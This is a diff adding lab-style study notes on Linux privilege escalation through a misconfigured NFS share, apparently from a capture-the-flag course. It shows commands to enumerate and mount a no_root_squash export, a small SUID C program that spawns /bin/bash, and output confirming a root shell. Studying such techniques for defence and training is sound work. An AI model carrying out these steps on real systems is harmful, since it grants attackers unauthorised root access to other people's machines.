@@ -734,4 +734,74 @@ id
 uid=0(root) gid=0(root) groups=0(root),1001(karen)
 ```
 ## Privilege Escalation: NFS
+* Shared folders and remote management interfaces (SSH / Telnet) can help gain root access to a target.
+  * E.g. finding root SSH private key.
+* Misconfigured network shell may be another attack vector.
+* Network File Sharing (NFS) located in `/etc/exports/ file.
+  * Created during NFS server install.
+```
+cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/backup *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
+```
+* `no_root_squash` option is critical element for privilege escalation.
+* NSF changes root user to nsfnobody and strips any file from operation with root privileges by default.
+* Can create executable with SUID bit set and run it on target if 1no_root_squash1 is preent on writable share.
+* Enumerate mountable shares from attacking machine.
+```
+showmount -e 10.10.91.21
+Export list for 10.10.91.21:
+/home/ubuntu/sharedfolder *
+/tmp                      *
+/home/backup              *
+```
+* Mount one of the `no_root_squash` shares to the attacking machine.
+```
+mkdir /tmp/sharedfolder
+mount -o rw 10.10.91.21:/home/ubuntu/sharedfolder /tmp/sharedfolder
+```
+* Create C executable to run `/bin/bash` on target.
+1. `nano nfs.c`.
+```
+int main()
+{
+   setgid(0);
+   setuid(0);
+   system("/bin/bash");
+   return 0;
+}
+```
+2. CTRL+X to save and close.
+3. Compile the code (must be run as sudo).
+```
+sudo gcc nfs.c -o nfs -w
+sudo chmod +s nfs
+ls -l nfs
+-rwsr-sr-x 1 root root 8392 Feb 13 14:46 nfs
+```
+* Copy files to target.
+```
+cp /root/nfs /root/nfs.c /tmp/sharedfolder
+```
+* Navigate to the `/home/ubuntu/sharedfolder' from the target and execute the "nfs" file.
+```
+cd /home/ubuntu/sharedfolder
+id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)
+./nfs
+id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
+* Root shell achieved. 
 ## Capstone Challenge
